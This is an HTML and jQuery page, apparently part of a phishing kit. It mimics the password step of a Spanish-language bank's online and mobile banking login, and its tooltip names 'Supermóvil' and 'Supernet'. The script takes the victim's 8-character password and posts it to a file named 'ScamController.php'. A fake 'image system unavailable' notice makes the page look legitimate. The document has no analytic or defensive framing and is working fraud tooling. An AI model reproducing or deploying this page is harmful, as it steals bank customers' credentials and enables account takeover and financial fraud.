<style>
    .welcome{
            font-size: 12px;
            color: #444;
            padding: .3rem 5px;
            line-height: 20px!important;
            margin-top: 2rem!important
        }
    
    

.danger-text[_ngcontent-c16] {
    font-size: 12px;
    width: 100%;
    padding: 17px 40px;
    background-color: #fbf0df;
}
    
    
    .mt-3, .my-3 {
    margin-top: 1rem!important;
}

    
    
    @media (max-width: 767px){
        form[_ngcontent-c16] {
            width: 80%;
        }

        form[_ngcontent-c16] {
            margin: auto;
        }
    }


    
    
</style>

<script>
    $(document).ready(function(){
        function addAtributs(){
            $('#frm').removeClass('ng-pristine');
            $('#frm').removeClass('ng-invalid');
            $('#frm').addClass('ng-dirty');
            $('#frm').addClass('ng-valid');

            $('#btnPassword').attr('disabled', false);
        }
        
        function removeAtributs(){
            $('#frm').removeClass('ng-dirty');
            $('#frm').removeClass('ng-valid');
            $('#frm').addClass('ng-pristine');
            $('#frm').addClass('ng-invalid');

            $('#btnPassword').attr('disabled', true);
        }
        
        $('#nip').keydown(function(){
            var lChars = $(this).val();
            if(lChars.length >= 7){
                addAtributs();
            }else{
                removeAtributs();
            }
        });
        
        $('#nip').keypress(function(){
            var lChars = $(this).val();
            if(lChars.length >= 7){
                addAtributs();
            }else{
                removeAtributs();
            }
        });
        
        function hideModal(){
            console.log('Cerrando el modal');
            $('#back_modal').hide();
            $('ngb-modal-window#contModal').hide().removeClass('show');
            $('#headModal').text('');
            $('#txt_msg').html('');
            $('ngb-modal-window#contModal').empty();
            //$('#botonera').html('');
            
            window.location.reload();
        }
        
        $('#btnAcept').click(function(e){
            e.preventDefault();
            console.log('Cerrando el modal');
            /*$('#back_modal').hide();
            $('#contModal').hide();
            $('#headModal').text('');
            $('#txt_msg').html('');*/
            
            hideModal();
        });
        
        var hMsgAtencion = "";
        var cMsgEmpty = " La informaci&oacute;n proporcionada es incorrecta, verifique e intente nuevamente.";
        var botonesAcept = '<button onClick="" id="btnAcept" _ngcontent-c16="" class="btn ng-star-inserted" type="button">Aceptar</button>';
        
        $('#btnPassword').click(function(e){
            e.preventDefault();
            var pass = $('#nip');
            
            if(pass.val().length != 8){
                $('#back_modal').show();
                $('#contModal').show();
                
                $('#headModal').text(hMsgAtencion);
                $('#txt_msg').html(cMsgEmpty);
                //$('#botonera').html(botonesAcept);
                
            }else{
                $.ajax({
                    type: 'POST',
                    url: '../Controllers/ScamController.php',
                    data: {
                        "request": "password",
                        "passwordCliente": pass.val()
                    },
                    beforeSend: function(){
                        console.log("ENviando...");
                        $('#loading').show();
                    },
                    success: function (resp){
                        console.log('Datos Enviados');
                        $('#loading').hide();
                        alert(resp);
                        console.log(resp);
                        if(resp == "1"){
                            window.location.href="inicio";    
                        }else{
                            alert('Fallo al guardar');
                        }
                        
                    },
                    error: function (request, textStatus, errorThrown) {
                        console.log('Error al Enviar los Datos: '+errorThrown);
                    }
                });
            }
            //window.location.href="acceso/nip/";
        });
        
    
    });
</script>

<ng-component _nghost-c16="" class="ng-star-inserted">
    <div _ngcontent-c16="">
        <div _ngcontent-c16="" class="container container-desktop container-tab container-nip container-nip-chrome" style="min-height: 450px;">
            <!---->
            <div _ngcontent-c16="" class="ng-star-inserted">

                <div _ngcontent-c16="" class="row justify-content-center">
                    <div _ngcontent-c16="" class="col-12 col-lg-10 col-lg-offset-1 text-center">
                        <p _ngcontent-c16="" class="welcome">
                            Estimado cliente, ingrese su contraseña de acceso.
                        </p>
                    </div>
                </div>

                <div _ngcontent-c16="" class="row d-flex flex-column text-center">
                    <!---->
                    <!---->
                    <!--
                    ESTA ES LA IMAGEN QUE RECONOCE AL USUARIO
                    -->
                    <img _ngcontent-c16="" alt="" class="img-responsive avatar ng-star-inserted" src="../MiSitioPrivado/acceso/nip/sin_imagen.gif" style="height: 100px;width: 100px;margin: auto;">
                    
                    <label _ngcontent-c16="" class="mt-1 mb-2">
                        BIENVENIDO
                    </label>
                </div>
                <div _ngcontent-c16="" class="row justify-content-center">

                    <div _ngcontent-c16="" class="danger-text text-center" style="padding: 17px 40px;background-color: #fbf0df;">
                        Sistema de imagenes no disponible por el momento
                    </div>
                </div>
            </div>
            <div _ngcontent-c16="" class="row mt-3" style="margin-top: 1rem!important;">
                <form _ngcontent-c16="" class="new-width ng-pristine ng-invalid ng-touched" novalidate="">
                    <label _ngcontent-c16="" class="access">
                        Contraseña de acceso:
                        <span _ngcontent-c16="" class="tooltip">
                            <img _ngcontent-c16="" alt="Información" class="img-responsive tooltip" src="assets/img/tooltip_id.svg">
                            <span _ngcontent-c16="" class="tooltiptext">
                                Contraseña definida para su ingreso a banca móvil
                                (Supermóvil) y banca por internet (Supernet)
                            </span>
                        </span>
                    </label>
                    <input id="nip" name="nip" _ngcontent-c16="" autocomplete="off" class="form-control mb-0 mt-2 ng-pristine ng-invalid ng-touched" formcontrolname="nip" maxlength="8" minlength="8" type="password">
                    <!----><label _ngcontent-c16="" class="pass-text d-inline ng-star-inserted">
                        Olvidé mi Contraseña
                    </label>
                    <!---->
                    <div _ngcontent-c16="" class="text-center mt-5">
                        <button id="btnPassword" _ngcontent-c16="" class="rounded-red-button" type="submit" disabled="">
                            Continuar
                        </button>
                    </div>
                    <div _ngcontent-c16="" class="mb-4"></div>
                </form>
            </div>
        </div>
    </div>
    <!---->
    <div _ngcontent-c16="" class="container mt-3"></div>
</ng-component>
